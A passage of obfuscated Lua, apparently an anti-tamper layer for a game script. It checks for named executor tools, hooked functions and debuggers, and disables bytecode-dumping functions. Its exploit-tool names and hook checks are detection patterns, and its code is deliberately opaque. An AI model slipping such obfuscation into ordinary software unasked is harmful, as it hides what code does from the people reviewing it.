 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(101,120,112,108,111,105,116))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,101,120,112,108,111,105,116) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(99,97,114,98,111,110))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,99,97,114,98,111,110) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(83,105,109,112,108,101,71,117,105))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,115,105,109,112,108,101,103,117,105) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(67,111,114,101,71,117,105))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,99,111,114,101,103,117,105) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(83,79,76,65,82,65,95,76,79,65,68,69,68))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,115,111,108,97,114,97,95,108,111,97,100,101,100) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(67,79,68,69,88,95,76,79,65,68,69,68))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,99,111,100,101,120,95,108,111,97,100,101,100) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(65,87,80,95,76,79,65,68,69,68))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,97,119,112,95,108,111,97,100,101,100) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(69,76,89,83,73,65,78,95,76,79,65,68,69,68))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,101,108,121,115,105,97,110,95,108,111,97,100,101,100) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(86,69,71,65,95,76,79,65,68,69,68))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,118,101,103,97,95,108,111,97,100,101,100) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(72,121,100,114,111,120,105,100,101))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,104,121,100,114,111,120,105,100,101) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(83,69,86,65,85,76,84))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,115,101,118,97,117,108,116) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(78,105,110,106,97,86,51))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,110,105,110,106,97,118,51) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(85,78,67,95,69,78,86))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,117,110,99,95,101,110,118) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(83,69,78,86))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,115,101,110,118) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(69,86,79,78,95,76,79,65,68,69,68))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,101,118,111,110,95,108,111,97,100,101,100) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(99,97,99,104,101,100,78,97,109,101))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,99,97,99,104,101,100,110,97,109,101) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(68,65,82,75,95,76,79,65,68,69,68))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(110,115,95,100,97,114,107,95,108,111,97,100,101,100) end
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(114,101,112,108,97,99,101,99,108,111,115,117,114,101))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(114,101,112,108,97,99,101,99,108,111,115,117,114,101) end
 local _genvF=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,103,101,110,118))
 if type(_genvF)=="function" then
 local _ok,_ge=_0HPqe1SXm6jO(_genvF)
 if _ok and type(_ge)=="table" and _ge~=_G then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,101,110,118,95,101,110,118) end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0cbhGqYKaFD1=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,114,97,119,109,101,116,97,116,97,98,108,101))
 if type(_0cbhGqYKaFD1)=="function" then
 local _0Lx5gzRqp05X=_0cbhGqYKaFD1(_G)
 if _0Lx5gzRqp05X then
 local _0P8avkcjjisv=rawget(_0Lx5gzRqp05X,string.char(95,95,110,101,119,105,110,100,101,120))
 local _0ONS8zzGx9A4=rawget(_0Lx5gzRqp05X,string.char(95,95,105,110,100,101,120))
 local _0Ar7_0Ky6P6F=rawget(_0Lx5gzRqp05X,string.char(95,95,99,97,108,108))
 local _0SvzyJv2CCgu=rawget(_0Lx5gzRqp05X,string.char(95,95,116,111,115,116,114,105,110,103))
 local _0nwV3xUNTgxT=rawget(_0Lx5gzRqp05X,string.char(95,95,108,101,110))
 if _0P8avkcjjisv~=nil or _0ONS8zzGx9A4~=nil or _0Ar7_0Ky6P6F~=nil or _0nwV3xUNTgxT~=nil then
 _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,109,116,95,104,111,111,107)
 end
 end
 local _0WZfGujamRUy=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,104,97,114,101,100))
 if type(_0WZfGujamRUy)=="table" then
 local _0YPDAaC89yxe=_0cbhGqYKaFD1(_0WZfGujamRUy)
 if _0YPDAaC89yxe and (rawget(_0YPDAaC89yxe,string.char(95,95,110,101,119,105,110,100,101,120))~=nil or rawget(_0YPDAaC89yxe,string.char(95,95,105,110,100,101,120))~=nil) then
 _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,104,97,114,101,100,95,104,111,111,107)
 end
 end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0LxPWmJtmLQS=tostring(math.random(100000000,999999999))
 local _0XG7hPgmP7HF=math.random(1000000,9999999)
 rawset(_G,_0LxPWmJtmLQS,_0XG7hPgmP7HF)
 local _0SAbBqNrZXcf=rawget((type(getfenv)=="function" and getfenv(0) or _G),_0LxPWmJtmLQS)
 if _0SAbBqNrZXcf~=_0XG7hPgmP7HF then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(101,110,118,95,105,110,116,101,114,99,101,112,116) end
 rawset(_G,_0LxPWmJtmLQS,nil)
 local _grm2=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,114,97,119,109,101,116,97,116,97,98,108,101))
 if type(_grm2)=="function" then
 local _gmt2=_grm2(_G)
 if _gmt2 and rawget(_gmt2,string.char(95,95,110,101,119,105,110,100,101,120))~=nil then
 _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,121,110,97,109,105,99,95,110,105)
 end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 if rawequal(string.char(120),string.char(120))~=true then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(114,97,119,101,113,117,97,108,95,116,97,109,112,101,114) end
 if rawequal(1,2)~=false then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(114,97,119,101,113,117,97,108,95,102,97,108,115,101) end
 local _grm3=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,114,97,119,109,101,116,97,116,97,98,108,101))
 if type(_grm3)=="function" then
 local _rmt3=_grm3(rawequal)
 if type(_rmt3)=="table" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(114,97,119,101,113,117,97,108,95,109,116) end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0g0klDWw7fXc={}
 local _0rPMlij05Zbs=tostring(math.random(1e7,9e7))
 rawset(_0g0klDWw7fXc,_0rPMlij05Zbs,_0rPMlij05Zbs)
 if rawget(_0g0klDWw7fXc,_0rPMlij05Zbs)~=_0rPMlij05Zbs then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,97,110,97,114,121,49) end
 local _0XKZZa4hxZYh=setmetatable({},{})
 local _0vLg1uXzHo6r=tostring(math.random(1e8,9e8))
 rawset(_0XKZZa4hxZYh,_0vLg1uXzHo6r,_0vLg1uXzHo6r)
 if rawget(_0XKZZa4hxZYh,_0vLg1uXzHo6r)~=_0vLg1uXzHo6r then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,97,110,97,114,121,50) end
 local _0XdEkNhEAKJ0=setmetatable({},{__newindex=function(t,k,v) rawset(t,k,v) end})
 local _0v5nSm4x1nP1=tostring(math.random(1e9,9e9))
 rawset(_0XdEkNhEAKJ0,_0v5nSm4x1nP1,_0v5nSm4x1nP1)
 if rawget(_0XdEkNhEAKJ0,_0v5nSm4x1nP1)~=_0v5nSm4x1nP1 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,97,110,97,114,121,51) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0Lhdc_k8sLJb=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,102,101,110,118))
 local _0L_gXuB96vOv=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,101,116,102,101,110,118))
 if type(_0Lhdc_k8sLJb)=="function" then
 local _ok,_0ayVT7vX3V8Z=_0HPqe1SXm6jO(_0Lhdc_k8sLJb,0)
 if _ok and type(_0ayVT7vX3V8Z)=="table" then
 local _0LqRmejNlfBU=getmetatable(_0ayVT7vX3V8Z)
 if type(_0LqRmejNlfBU)=="table" then
 if rawget(_0LqRmejNlfBU,string.char(95,95,110,101,119,105,110,100,101,120))~=nil or rawget(_0LqRmejNlfBU,string.char(95,95,105,110,100,101,120))~=nil then
 _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(102,101,110,118,95,104,111,111,107)
 end
 end
 end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0DHWwQSXH4Mn=rawget(string,string.char(99,104,97,114))
 local _0BuNpadKXIm_=rawget(string,string.char(98,121,116,101))
 local _0RRDjuA7Exc6=rawget(string,string.char(102,111,114,109,97,116))
 if type(_0DHWwQSXH4Mn)~=string.char(102,117,110,99,116,105,111,110) or type(_0BuNpadKXIm_)~=string.char(102,117,110,99,116,105,111,110) or type(_0RRDjuA7Exc6)~=string.char(102,117,110,99,116,105,111,110) then
 _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,95,116,97,109,112,101,114)
 end
 local _0noXVzb6Nu5N=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(108,111,97,100)) or rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(108,111,97,100,115,116,114,105,110,103))
 if _0noXVzb6Nu5N==nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(108,111,97,100,95,110,105,108) end
 if debug and rawget(debug,string.char(103,101,116,105,110,102,111)) then
 _0HPqe1SXm6jO(function()
 local _0wJK0uIo_u1I=debug.getinfo(pcall,string.char(83))
 if _0wJK0uIo_u1I and _0wJK0uIo_u1I.what~=string.char(67) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(112,99,97,108,108,95,112,114,111,120,121) end
 end)
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0hHEbMpQZ_K9=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,101,98,117,103)) or debug
 if _0hHEbMpQZ_K9 then
 _0HPqe1SXm6jO(function()
 if type(rawget(_0hHEbMpQZ_K9,string.char(115,101,116,104,111,111,107)))=="function" then _0hHEbMpQZ_K9.sethook() end
 end)
 if type(rawget(_0hHEbMpQZ_K9,string.char(103,101,116,104,111,111,107)))=="function" then
 local _0gkvJ88qf8sr,_0AppH8Zm5Ali,_0hIvJZvyozTi=_0hHEbMpQZ_K9.gethook()
 if type(_0gkvJ88qf8sr)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(104,111,111,107,95,97,99,116,105,118,101) end
 end
 if type(rawget(_0hHEbMpQZ_K9,string.char(103,101,116,105,110,102,111)))=="function" then
 local _0XoRaLfDJTjG=_0hHEbMpQZ_K9.getinfo(1,string.char(83))
 if _0XoRaLfDJTjG and _0XoRaLfDJTjG.what==string.char(67) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,95,102,114,97,109,101) end
 end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 if string and rawget(string,string.char(100,117,109,112)) then
 _0HPqe1SXm6jO(function() rawset(string,string.char(100,117,109,112),function()error("")end) end)
 end
 local _0XjHLlkJQs3s=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101))
 if type(_0XjHLlkJQs3s)=="function" then
 rawset(_G,string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101),function()error("")end)
 _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(98,99,95,100,117,109,112)
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0XB7paqk_I0z=(rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(116,105,99,107)) and tick) or (os and os.clock and os.clock) or nil
 if _0XB7paqk_I0z then
 local _0FByR7Q5a87Z=_0XB7paqk_I0z()
 local _0S_s6ym97ZNl=0
 for _k=1,300 do _0S_s6ym97ZNl=_0S_s6ym97ZNl+_k end
 local _0bAsjIPgdeEu=_0XB7paqk_I0z()-_0FByR7Q5a87Z
 if _0bAsjIPgdeEu~=nil and _0bAsjIPgdeEu>0.9 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,101,112,95,100,98,103) end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0dVceMD5RtWg=0
 local function _depthProbe() _0dVceMD5RtWg=_0dVceMD5RtWg+1; if _0dVceMD5RtWg<4 then _depthProbe() end end
 _0HPqe1SXm6jO(_depthProbe)
 if _0dVceMD5RtWg~=4 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,101,112,116,104,95,116,97,109,112,101,114) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 if debug and rawget(debug,string.char(103,101,116,105,110,102,111)) then
 local _0rmi57QEfeFh=debug.getinfo(coroutine.wrap,string.char(83))
 if _0rmi57QEfeFh and _0rmi57QEfeFh.what~=string.char(67) then
 _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,111,119,114,97,112,95,112,114,111,120,121)
 end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _ld2=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(108,111,97,100,115,116,114,105,110,103)) or rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(108,111,97,100))
 if type(_ld2)=="function" then
 local _ok2,_fn2=_ld2(string.char(114,101,116,117,114,110,32,49,43,49))
 if not _ok2 or (type(_fn2)=="function" and _fn2()~=2) then
 _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(108,111,97,100,95,116,97,109,112,101,114)
 end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _sf=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(115,101,116,102,101,110,118))
 local _gf=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,102,101,110,118))
 if type(_sf)=="function" and type(_gf)=="function" then
 local _dummy=function() end
 local _fakeEnv={_testKey=12345}
 _0HPqe1SXm6jO(_sf,_dummy,_fakeEnv)
 local _ok3,_got3=_0HPqe1SXm6jO(_gf,_dummy)
 if _ok3 and type(_got3)=="table" and (_got3._testKey~=12345) then
 _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,101,116,102,101,110,118,95,104,111,111,107)
 end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0KNNDT8woo8j=rawget(table,string.char(112,97,99,107)) or rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(112,97,99,107))
 local _0xUl1HyxYsHq=rawget(table,string.char(117,110,112,97,99,107)) or rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(117,110,112,97,99,107))
 if type(_0xUl1HyxYsHq)=="function" then
 local _r1,_r2,_r3=_0xUl1HyxYsHq({10,20,30})
 if _r1~=10 or _r2~=20 or _r3~=30 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(117,110,112,97,99,107,95,116,97,109,112,101,114) end
 end
 if type(_0KNNDT8woo8j)=="function" then
 local _pk=_0KNNDT8woo8j(1,2,3)
 if type(_pk)~="table" or _pk[1]~=1 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(112,97,99,107,95,116,97,109,112,101,114) end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _hop=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(104,111,111,107,111,112))
 if type(_hop)=="function" then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(104,111,111,107,111,112) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _isl=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(105,115,108,99,108,111,115,117,114,101))
 local _ld3=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(108,111,97,100,115,116,114,105,110,103)) or rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(108,111,97,100))
 if type(_isl)=="function" and type(_ld3)=="function" then
 if _isl(_ld3) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(108,111,97,100,95,104,111,111,107,101,100) end
 end
 local _tc=rawget(table,string.char(99,111,110,99,97,116))
 if type(_isl)=="function" and type(_tc)=="function" then
 if _isl(_tc) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(116,99,111,110,99,97,116,95,104,111,111,107,101,100) end
 end
 if type(_isl)=="function" and _isl(rawget) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(114,97,119,103,101,116,95,104,111,111,107,101,100) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _isl2=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(105,115,108,99,108,111,115,117,114,101))
 if type(_isl2)~="function" then return end
 if type(rawget(string,string.char(99,104,97,114)))=="function" and _isl2(rawget(string,string.char(99,104,97,114))) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,99,104,97,114,95,104,111,111,107,101,100) end
 if type(rawget(string,string.char(98,121,116,101)))=="function" and _isl2(rawget(string,string.char(98,121,116,101))) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(115,116,114,98,121,116,101,95,104,111,111,107,101,100) end
 if type(rawget(table,string.char(99,111,110,99,97,116)))=="function" and _isl2(rawget(table,string.char(99,111,110,99,97,116))) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(116,99,111,110,99,97,116,95,104,111,111,107,101,100,50) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _grm2=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,114,97,119,109,101,116,97,116,97,98,108,101))
 if type(_grm2)=="function" then
 local _gmt2=_grm2(_G)
 if type(_gmt2)=="table" then
 if rawget(_gmt2,string.char(95,95,105,110,100,101,120))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,95,105,100,120,95,104,111,111,107) end
 if rawget(_gmt2,string.char(95,95,110,101,119,105,110,100,101,120))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,95,110,105,95,104,111,111,107) end
 if rawget(_gmt2,string.char(95,95,110,97,109,101,99,97,108,108))~=nil then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(103,95,110,99,95,104,111,111,107) end
 end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _ncc=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(110,101,119,99,99,108,111,115,117,114,101))
 local _hkf=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(104,111,111,107,102,117,110,99,116,105,111,110))
 if type(_ncc)=="function" and type(_hkf)=="function" then
 _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(104,111,111,107,95,101,110,118)
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _chk=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(99,104,101,99,107,99,97,108,108,101,114))
 if type(_chk)=="function" then
 local _ok,_r=_0HPqe1SXm6jO(_chk)
 if _ok and _r==true then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,104,101,99,107,99,97,108,108,101,114,95,109,111,99,107) end
 end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0Ft4BWKkFdj9,_0wkrYt5hDC8W,_0He25oOvaAGy=49722,58906,9248
 do local _r;if bit32 then _r=bit32.bxor(_0wkrYt5hDC8W,_0He25oOvaAGy) elseif bit then _r=bit.bxor(_0wkrYt5hDC8W,_0He25oOvaAGy) else local a,b,r,s=_0wkrYt5hDC8W,_0He25oOvaAGy,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0Ft4BWKkFdj9 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,48) end end
 local _0s0GUyHHDapa,_0UVFVetK0MVL,_0gsDTOYW4j3e=4212,48093,43945
 do local _r;if bit32 then _r=bit32.bxor(_0UVFVetK0MVL,_0gsDTOYW4j3e) elseif bit then _r=bit.bxor(_0UVFVetK0MVL,_0gsDTOYW4j3e) else local a,b,r,s=_0UVFVetK0MVL,_0gsDTOYW4j3e,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0s0GUyHHDapa then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,49) end end
 local _0EKi1feoLP52,_0wLpFmfcsxzv,_0PNIZElupwsy=891,55751,55996
 do local _r;if bit32 then _r=bit32.bxor(_0wLpFmfcsxzv,_0PNIZElupwsy) elseif bit then _r=bit.bxor(_0wLpFmfcsxzv,_0PNIZElupwsy) else local a,b,r,s=_0wLpFmfcsxzv,_0PNIZElupwsy,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0EKi1feoLP52 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,50) end end
 local _0vtPRDaCzFO6,_0pYyQ2iBlQDz,_0aGmZ5IDvraj=36615,51493,17954
 do local _r;if bit32 then _r=bit32.bxor(_0pYyQ2iBlQDz,_0aGmZ5IDvraj) elseif bit then _r=bit.bxor(_0pYyQ2iBlQDz,_0aGmZ5IDvraj) else local a,b,r,s=_0pYyQ2iBlQDz,_0aGmZ5IDvraj,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0vtPRDaCzFO6 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,51) end end
 local _0E1cywzCLPFW,_0mqn6bVubkzB,_0IiVfkuyc3a6=12008,8701,3861
 do local _r;if bit32 then _r=bit32.bxor(_0mqn6bVubkzB,_0IiVfkuyc3a6) elseif bit then _r=bit.bxor(_0mqn6bVubkzB,_0IiVfkuyc3a6) else local a,b,r,s=_0mqn6bVubkzB,_0IiVfkuyc3a6,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0E1cywzCLPFW then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,52) end end
 local _0lgf5ey3tvIL,_0PnCNEQ4PuV_,_0PrhCHpTbNVX=43219,51296,24755
 do local _r;if bit32 then _r=bit32.bxor(_0PnCNEQ4PuV_,_0PrhCHpTbNVX) elseif bit then _r=bit.bxor(_0PnCNEQ4PuV_,_0PrhCHpTbNVX) else local a,b,r,s=_0PnCNEQ4PuV_,_0PrhCHpTbNVX,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0lgf5ey3tvIL then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,53) end end
 local _0wNqIo6_XTSx,_0OQI5gYCwjYL,_0aOpFZNSXvkH=48167,45165,3146
 do local _r;if bit32 then _r=bit32.bxor(_0OQI5gYCwjYL,_0aOpFZNSXvkH) elseif bit then _r=bit.bxor(_0OQI5gYCwjYL,_0aOpFZNSXvkH) else local a,b,r,s=_0OQI5gYCwjYL,_0aOpFZNSXvkH,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0wNqIo6_XTSx then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,54) end end
 local _0KcjkVoDJ6mr,_0JncnPYjZn3X,_0n0PoOBYpr2F=4924,14200,9284
 do local _r;if bit32 then _r=bit32.bxor(_0JncnPYjZn3X,_0n0PoOBYpr2F) elseif bit then _r=bit.bxor(_0JncnPYjZn3X,_0n0PoOBYpr2F) else local a,b,r,s=_0JncnPYjZn3X,_0n0PoOBYpr2F,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0KcjkVoDJ6mr then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,55) end end
 local _0To7yTWl2VJf,_0tzkVrYNDcG1,_0Fd8wNCzfyVM=37139,5496,33899
 do local _r;if bit32 then _r=bit32.bxor(_0tzkVrYNDcG1,_0Fd8wNCzfyVM) elseif bit then _r=bit.bxor(_0tzkVrYNDcG1,_0Fd8wNCzfyVM) else local a,b,r,s=_0tzkVrYNDcG1,_0Fd8wNCzfyVM,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0To7yTWl2VJf then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,56) end end
 local _0GjjJDFMXnfI,_0JDffEYABokJ,_0VyHWsUDhhVm=53078,51748,1394
 do local _r;if bit32 then _r=bit32.bxor(_0JDffEYABokJ,_0VyHWsUDhhVm) elseif bit then _r=bit.bxor(_0JDffEYABokJ,_0VyHWsUDhhVm) else local a,b,r,s=_0JDffEYABokJ,_0VyHWsUDhhVm,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0GjjJDFMXnfI then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,57) end end
 local _0TRMpnLl4He9,_0UdjvZozio0C,_0uZJmjfDhVTE=42306,17287,59077
 do local _r;if bit32 then _r=bit32.bxor(_0UdjvZozio0C,_0uZJmjfDhVTE) elseif bit then _r=bit.bxor(_0UdjvZozio0C,_0uZJmjfDhVTE) else local a,b,r,s=_0UdjvZozio0C,_0uZJmjfDhVTE,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0TRMpnLl4He9 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,49,48) end end
 local _0Zoh_yMRIh9H,_0UiDHdK7mZ1L,_0sbnQ9nmKmU4=35702,57124,21586
 do local _r;if bit32 then _r=bit32.bxor(_0UiDHdK7mZ1L,_0sbnQ9nmKmU4) elseif bit then _r=bit.bxor(_0UiDHdK7mZ1L,_0sbnQ9nmKmU4) else local a,b,r,s=_0UiDHdK7mZ1L,_0sbnQ9nmKmU4,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0Zoh_yMRIh9H then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,49,49) end end
 local _0swueCXvc7Iz,_0D2RUShadMNZ,_0svk0khBpVU3=27542,19928,9806
 do local _r;if bit32 then _r=bit32.bxor(_0D2RUShadMNZ,_0svk0khBpVU3) elseif bit then _r=bit.bxor(_0D2RUShadMNZ,_0svk0khBpVU3) else local a,b,r,s=_0D2RUShadMNZ,_0svk0khBpVU3,0,1;while a>0 or b>0 do if a%2~=b%2 then r=r+s end;a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;_r=r end;if _r~=_0swueCXvc7Iz then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(99,120,49,50) end end
 local _0PeySwyE8u0f,_0cMC18qdv0Gx,_0taArOKTLmV4=25147,32736,7643
